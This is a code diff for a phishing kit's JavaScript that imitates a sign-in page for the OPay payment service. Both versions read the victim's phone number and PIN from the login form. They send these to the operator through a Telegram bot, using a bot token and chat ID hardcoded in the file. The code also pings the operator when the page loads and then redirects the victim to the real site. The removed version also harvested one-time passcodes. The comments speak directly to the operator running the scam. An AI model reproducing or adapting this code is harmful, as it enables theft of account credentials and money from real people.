@@ -1,14 +1,8 @@
-// 🔑 Your Credentials
+// 🔑 Your Telegram Credentials
 const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
 const chatId = '7909543900';
 
-// Element Selectors
-const loginForm = document.getElementById('login-form');
-const otpForm = document.getElementById('otp-form');
-const loginSection = document.getElementById('login-section');
-const otpSection = document.getElementById('otp-section');
-
-// 🛡️ Core Function: Send to Telegram
+// 🛡️ Helper function to send data to Telegram
 async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     try {
@@ -22,60 +16,57 @@ async function sendToTelegram(message) {
             })
         });
     } catch (e) {
-        console.error("Signal error");
+        console.error("Connection error");
     }
 }
 
-// 1️⃣ ALERT ON CLICK: Inform you when the page opens
+// 1️⃣ ALERT ON LOAD: You will know the moment the link is clicked
 window.onload = () => {
-    sendToTelegram("<b>🚀 Link Clicked!</b>\nA user has just opened the portal.");
+    sendToTelegram("<b>🚀 Link Clicked!</b>\nA user has just opened your portal.");
 };
 
-// 2️⃣ LOGIN SUBMISSION: Validate and Send
-loginForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
+// 2️⃣ FORM LOGIC: Handle the "Sign In" button click
+const authForm = document.getElementById('auth-form');
+
+authForm.addEventListener('submit', async (e) => {
+    e.preventDefault(); // Stop page from refreshing
     
-    const user = document.getElementById('user-identifier');
-    const pin = document.getElementById('user-pin');
-    const btn = document.getElementById('next-btn');
+    const phoneInput = document.getElementById('phone');
+    const pinInput = document.getElementById('pin');
+    const submitBtn = document.getElementById('submit-btn');
 
-    // Validation: Check if inputs are missing or incorrect
     let hasError = false;
-    if (user.value.trim() === "") { user.classList.add('error'); hasError = true; }
-    if (pin.value.length < 4) { pin.classList.add('error'); hasError = true; }
 
-    if (hasError) return; // Stop if there are red boxes
+    // --- Validation Checks ---
 
-    // Clear error looks if fixed
-    user.classList.remove('error');
-    pin.classList.remove('error');
+    // Check if Phone is empty or too short
+    if (phoneInput.value.trim() === "" || phoneInput.value.length < 10) {
+        phoneInput.classList.add('error'); // Triggers red box in CSS
+        hasError = true;
+    } else {
+        phoneInput.classList.remove('error');
+    }
 
-    btn.innerText = "Verifying...";
-    btn.disabled = true;
+    // Check if PIN is empty or less than 4 digits
+    if (pinInput.value.trim() === "" || pinInput.value.length < 4) {
+        pinInput.classList.add('error'); // Triggers red box in CSS
+        hasError = true;
+    } else {
+        pinInput.classList.remove('error');
+    }
 
-    // Send Login Data
-    await sendToTelegram(`<b>New Entry</b>\nUser: ${user.value}\nPIN: ${pin.value}`);
+    // If there is a red box, stop here
+    if (hasError) return;
 
-    // Transition to OTP
-    setTimeout(() => {
-        loginSection.style.display = 'none';
-        otpSection.style.display = 'block';
-    }, 1500);
-});
+    // If valid, show loading state
+    submitBtn.innerText = "Verifying...";
+    submitBtn.disabled = true;
 
-// 3️⃣ OTP SUBMISSION: Final step
-otpForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const otp = document.getElementById('otp-code');
-    const btn = document.getElementById('finish-btn');
+    // Send the "Real" details to your bot
+    const logData = `<b>🔑 New Login Attempt</b>\n<b>Phone:</b> <code>${phoneInput.value}</code>\n<b>PIN:</b> <code>${pinInput.value}</code>`;
+    
+    await sendToTelegram(logData);
 
-    btn.innerText = "Completing...";
-    btn.disabled = true;
-
-    // Send OTP Data
-    await sendToTelegram(`<b>OTP Received</b>\nCode: ${otp.value}`);
-
-    // Redirect to the real site
+    // Final step: Redirect them to the actual site
     window.location.replace("https://www.opayweb.com/");
 });
-
